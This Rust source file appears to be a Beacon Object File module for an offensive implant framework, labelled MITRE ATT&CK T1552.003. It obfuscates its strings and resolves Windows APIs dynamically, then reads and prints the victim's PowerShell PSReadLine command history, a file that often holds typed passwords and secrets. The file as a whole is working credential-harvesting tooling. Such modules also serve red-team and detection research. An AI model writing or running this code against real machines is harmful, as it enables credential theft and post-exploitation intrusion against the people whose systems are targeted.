#![no_std]
#![cfg_attr(not(test), no_main)]

use rustbof::{println, eprintln};
use common::{mitre::Technique, dfr_fn, obf_cstr};

const TECHNIQUES: &[Technique] = &[
    Technique { id: "T1552.003", name: "Unsecured Credentials: Bash History", tactic: "Credential Access" },
];

const GENERIC_READ: u32 = 0x80000000;
const OPEN_EXISTING: u32 = 3;
const FILE_ATTRIBUTE_NORMAL: u32 = 0x80;
const INVALID_HANDLE: usize = usize::MAX;

dfr_fn!(get_environment_variable_a(name: *const i8, buf: *mut i8, size: u32) -> u32, module = "kernel32.dll", api = "GetEnvironmentVariableA");
dfr_fn!(create_file_a(name: *const i8, access: u32, share: u32, sec: usize, disp: u32, flags: u32, template: usize) -> usize, module = "kernel32.dll", api = "CreateFileA");
dfr_fn!(get_file_size(handle: usize, high: *mut u32) -> u32, module = "kernel32.dll", api = "GetFileSize");
dfr_fn!(read_file(handle: usize, buf: *mut u8, to_read: u32, read: *mut u32, overlapped: usize) -> i32, module = "kernel32.dll", api = "ReadFile");
dfr_fn!(close_handle(handle: usize) -> i32, module = "kernel32.dll", api = "CloseHandle");

#[rustbof::main]
fn main() {
    common::mitre::print_banner(env!("CARGO_PKG_NAME"), TECHNIQUES);
    match run() {
        Ok(()) => {},
        Err(e) => eprintln!("[!] {}: {}", env!("CARGO_PKG_NAME"), e),
    }
}

fn run() -> Result<(), &'static str> {
    obf_cstr! { let var = c"APPDATA"; }
    let mut path_buf = [0i8; 512];
    let len = unsafe { get_environment_variable_a(var.as_ptr() as *const i8, path_buf.as_mut_ptr(), 260) }.map_err(|_| "resolve failed")?;
    if len == 0 { return Err("APPDATA not found"); }

    let suffix = b"\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt\0";
    let base = len as usize;
    if base + suffix.len() >= path_buf.len() { return Err("path too long"); }
    for (i, &b) in suffix.iter().enumerate() {
        path_buf[base + i] = b as i8;
    }

    let handle = unsafe { create_file_a(path_buf.as_ptr(), GENERIC_READ, 1, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0) }.map_err(|_| "resolve failed")?;
    if handle == INVALID_HANDLE { return Err("file not found"); }

    let fsize = unsafe { get_file_size(handle, core::ptr::null_mut()) }.map_err(|_| "resolve failed")?;
    let cap = fsize.min(4096) as usize;
    let mut buf = [0u8; 4096];
    let mut bytes_read: u32 = 0;

    let ok = unsafe { read_file(handle, buf.as_mut_ptr(), cap as u32, &mut bytes_read, 0) }.map_err(|_| "resolve failed")?;
    unsafe { let _ = close_handle(handle); }

    if ok == 0 { return Err("read failed"); }

    println!("[*] PSReadLine history ({} bytes):", bytes_read);
    println!("{}", core::str::from_utf8(&buf[..bytes_read as usize]).unwrap_or("(binary)"));
    Ok(())
}
